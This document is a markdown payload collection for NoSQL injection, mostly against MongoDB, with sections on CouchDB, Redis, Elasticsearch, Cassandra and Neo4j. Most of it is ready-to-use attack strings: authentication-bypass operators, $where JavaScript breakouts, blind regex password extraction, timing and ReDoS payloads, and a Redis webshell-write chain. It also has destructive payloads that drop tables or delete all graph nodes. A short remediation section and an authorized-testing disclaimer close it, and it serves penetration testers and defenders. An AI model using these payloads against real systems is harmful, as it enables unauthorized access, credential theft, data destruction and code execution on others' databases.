# NoSQL Injection

Payload collection for detecting and exploiting NoSQL injection, grouped by
technique and engine. MongoDB-focused (by far the most common), with sections
for CouchDB, Redis, Elasticsearch, Cassandra (CQL), and Neo4j (Cypher).
Detection/enumeration focus, for authorized testing and bug-bounty work only.

NoSQLi usually comes from unsanitized input reaching a query as an
**object/operator** instead of a string. Two broad channels:

- **Operator injection** — attacker controls JSON/BSON structure and smuggles
  query operators (`$ne`, `$gt`, `$regex`, `$where`, …). Classic in JSON APIs
  and frameworks that parse `field[op]=...` into nested objects.
- **Syntax injection** — attacker breaks out of a server-side expression/JS
  string (`$where`, `mapReduce`, Cypher, CQL) — closer to classic SQLi.

---

## 1. Detection — does input reach the query as structure?

Send the same parameter several ways and diff the responses:

| Form | Example | Signal |
|---|---|---|
| String (baseline) | `username=admin` | normal |
| Object operator (JSON) | `{"username":{"$ne":null}}` | different result set → injectable |
| Bracket-nested (urlencoded) | `username[$ne]=null` | same, for form/query parsing |
| Array | `username[]=admin` | type confusion / error |

Error/behaviour probes — malformed operators surface driver/stack traces:

```
'     "     \     ;     {     }     []     ()
{"$where": "1"}        {"$gt": ""}        {"$func": "x"}
{"$regex": "("}        true, false        {"$exists": true}
```

Confirming strings: `MongoError`, `BSONError`, `unknown operator`,
`$where is not allowed`, `CastError`, `unexpected token`.

---

## 2. Authentication bypass (operator injection)

JSON body (`Content-Type: application/json`):

```json
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "x"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$regex": "^.*"}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gte": ""}}
{"username": {"$nin": [""]}, "password": {"$nin": [""]}}
```

URL-encoded / form body (qs/Express, PHP driver build nested objects):

```
username=admin&password[$ne]=
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$ne]=
username[$in][]=admin&username[$in][]=root&password[$ne]=
username[$gte]=&password[$gte]=
```

GraphQL / JSON variables — operators via a loose object/JSON-scalar variable:

```json
{ "filter": { "username": "admin", "password": { "$ne": null } } }
{ "where":  { "role": { "$in": ["admin","superuser"] } } }
```

---

## 3. $where / server-side JS injection (syntax injection)

Reached when input is concatenated into `$where`, `mapReduce`, `$accumulator`,
or `$function`. Server-side JS is **disabled by default** on modern MongoDB
(`security.javascriptEnabled: false`) — test, don't assume.

Always-true breakouts (string context):

```
' || '1'=='1
' || 1==1//
' || 1==1%00
'; return true; var x='
'; return(true); var x='
admin' || 'a'=='a
0;return true
"; return true; //
```

Raw `$where`:

```json
{"$where": "return true"}
{"$where": "1==1"}
{"$where": "this.password.length > 0"}
{"$where": "this.role=='admin'"}
{"$where": "sleep(5000)"}
{"$where": "function(){return true}"}
```

Data exfil through `$where` (when JS enabled) — compare a known field char by
char and observe boolean/latency:

```json
{"$where": "this.password[0]=='a'"}
{"$where": "this.secret && this.secret.match(/^A/)"}
```

---

## 4. Blind — boolean extraction with $regex

Confirm true/false responses, then walk the hidden value:

```
# length discovery
{"username":"admin","password":{"$regex":"^.{1}$"}}
{"username":"admin","password":{"$regex":"^.{8}$"}}
{"username":"admin","password":{"$regex":"^.{1,}$"}}

# character walk (binary-search the charset)
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^[a-m]"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^admin.*"}}

# urlencoded form
username=admin&password[$regex]=^a
username=admin&password[$regex]=^admin.*
```

Notes: anchor with `^`; escape regex metachars in the known prefix; add
`$options:"s"` / `(?s)` if the value may contain newlines; use `$options:"i"`
to fold case while mapping, then confirm exact case.

---

## 5. Timing — blind with no boolean oracle

```json
{"$where": "sleep(5000)"}
{"$where": "function(){var d=Date.now();while(Date.now()-d<5000){};return true;}"}
{"username":"admin","password":{"$where":"sleep(3000)"}}
```

Regex ReDoS (works even when `$where` is off):

```json
{"password": {"$regex": "^(a+)+$"}}
{"password": {"$regex": "(.*a){1,20000}"}}
{"password": {"$regex": "(a|a?)+$"}}
```

---

## 6. Aggregation pipeline injection

When user input reaches `aggregate()` stages. `$lookup`, `$merge`, `$out`,
`$function`, `$accumulator` are high-impact (cross-collection read, write-out):

```json
[{"$match": {"user": {"$ne": null}}}, {"$lookup": {"from":"users","localField":"x","foreignField":"y","as":"z"}}]
[{"$match":{}}, {"$project":{"password":1,"_id":0}}]
[{"$group":{"_id":null,"all":{"$push":"$$ROOT"}}}]
```

`$expr` to inject comparison logic into a normal find:

```json
{"$expr": {"$gt": ["$balance", 0]}}
{"$expr": {"$eq": [1,1]}}
```

---

## 7. Operator cheat-sheet (MongoDB)

| Operator | Use |
|---|---|
| `$ne` | not equal — classic auth-bypass primitive |
| `$gt` `$gte` `$lt` `$lte` | comparisons; `$gt:""` matches any non-empty |
| `$in` `$nin` | match against / exclude a list |
| `$regex` (+`$options`) | pattern match → blind char-by-char extraction |
| `$exists` | field presence probing |
| `$where` | server-side JS (often disabled) |
| `$expr` | aggregation expressions inside a query |
| `$or` `$and` `$nor` | boolean logic injection |
| `$elemMatch` | array element matching |
| `$lookup` `$merge` `$out` | aggregation: cross-collection read / write-out |

---

## 8. Framework / parser notes

- **Express + `qs` / `body-parser`**: `user[$ne]=x` → `{user:{$ne:"x"}}`.
  `extended` parsing makes it reachable.
- **Mongoose**: casting blocks many operators on typed string fields, but
  `$where`, `Mixed` fields, and `.find(req.body)` passthroughs remain.
- **PHP (ext-mongodb)**: `?user[$ne]=1` → nested arrays → operator injection.
- **GraphQL / JSON APIs**: any resolver passing a variable straight into a
  filter; loose `JSON`/`Object` scalars are the tell.

---

## 9. Other engines

### CouchDB / Mango (`_find`)

```json
{"selector": {"password": {"$gt": null}}}
{"selector": {"_id": {"$gt": null}}}
{"selector": {"type": {"$ne": "x"}}}
```
HTTP API abuse: `GET /_all_dbs`, `GET /{db}/_all_docs?include_docs=true`.

### Redis (command injection via CRLF / unsafe eval)

```
\r\nCONFIG GET *\r\n
\r\nINFO\r\n
\r\nKEYS *\r\n
\r\nCONFIG SET dir /var/www/html\r\n          # RCE chain (webshell write)
```
Lua eval sinks: `eval "return redis.call('keys','*')" 0`.

### Elasticsearch

```json
{"query": {"match_all": {}}}
{"query": {"bool": {"must": {"script": {"script": "1==1"}}}}}
```
Painless/script injection, and `_search` wildcard query abuse.

### Cassandra (CQL injection)

```
' OR '1'='1
' ALLOW FILTERING--
'; DROP TABLE users--
admin' AND token(id) > token(0) ALLOW FILTERING--
```

### Neo4j (Cypher injection)

```
' OR 1=1 RETURN n--
' RETURN n UNION MATCH (u:User) RETURN u--
'}) RETURN n; MATCH (a) DETACH DELETE a; //
' OR 1=1 WITH 1 as x CALL dbms.components() YIELD name RETURN name//
```

---

## 10. Tooling

- `nosqli` (Go) — automated MongoDB NoSQLi scanner.
- `NoSQLMap` — operator/JS injection + enumeration.
- Burp: `Content-Type: application/json`, then Intruder over the payload
  wordlist; or use the "param[$op]=" conversion for urlencoded sinks.
- `wfuzz`/`ffuf` with the bracket-operator wordlist for form/query sinks.

---

## 11. Remediation (for reports)

- Validate/cast input types server-side; reject objects where a scalar is
  expected (a password must be a string, never `{}`).
- Disable server-side JS (`security.javascriptEnabled: false`); avoid `$where`,
  `mapReduce`, `$accumulator`, `$function` with any user input.
- Use typed schemas; never pass `req.body`/`req.query` straight into
  `find`/`findOne`/`aggregate`.
- Sanitize keys (strip leading `$` and `.` from user-controlled keys), e.g.
  `express-mongo-sanitize`.
- Parameterize CQL/Cypher; never string-concatenate queries.
- Enforce auth + least-privilege DB users; cap query execution time; disable
  unused HTTP APIs (CouchDB `_all_dbs`, ES dynamic scripting).

---

## References

- OWASP WSTG — Testing for NoSQL Injection
- OWASP Cheat Sheet — Injection Prevention
- PayloadsAllTheThings — NoSQL Injection
- MongoDB manual — query/projection operators, `$where`, aggregation, server-side JS

> For authorized security testing and education only.
